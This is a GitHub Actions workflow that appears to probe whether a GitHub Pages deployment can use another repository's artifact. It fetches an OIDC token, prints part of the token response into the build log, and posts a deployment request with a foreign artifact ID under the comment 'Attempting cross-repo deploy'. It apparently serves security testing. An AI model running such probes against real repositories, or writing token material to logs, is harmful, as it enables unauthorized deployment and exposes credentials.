name: Deploy Pages
on:
  push:
    branches: [main]
permissions:
  contents: read
  pages: write
  id-token: write
concurrency:
  group: pages
  cancel-in-progress: true
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:
      name: github-pages
      url: ${{ steps.deployment.outputs.page_url }}
    steps:
      - name: Get OIDC and call deployment API directly
        env:
          ACTIONS_RUNTIME_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          PAGES_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          ARTIFACT_ID: 6716804715
        run: |
          # Get OIDC token from Actions
          OIDC=$(curl -sSL -X GET -H "User-Agent: actions/oidc-client" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
              "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=nobody")
          echo "OIDC response (first 200 chars):"
          echo "$OIDC" | head -c 200
          OIDC_TOKEN=$(echo "$OIDC" | python3 -c "import json,sys;print(json.load(sys.stdin)['value'])" 2>/dev/null || echo "")
          echo "Got OIDC token len: ${#OIDC_TOKEN}"
          
          # Try to deploy with repo B's artifact_id
          echo "=== Attempting cross-repo deploy ==="
          curl -sS -X POST \
            -H "Authorization: bearer $GITHUB_TOKEN" \
            -H "Accept: application/vnd.github+json" \
            "https://api.github.com/repos/fox32932/pages-test-cycle9/pages/deployment" \
            -d "{\"artifact_id\":$ARTIFACT_ID,\"pages_build_version\":\"$GITHUB_SHA\",\"oidc_token\":\"$OIDC_TOKEN\"}" \
            -w "\nHTTP %{http_code}\n"
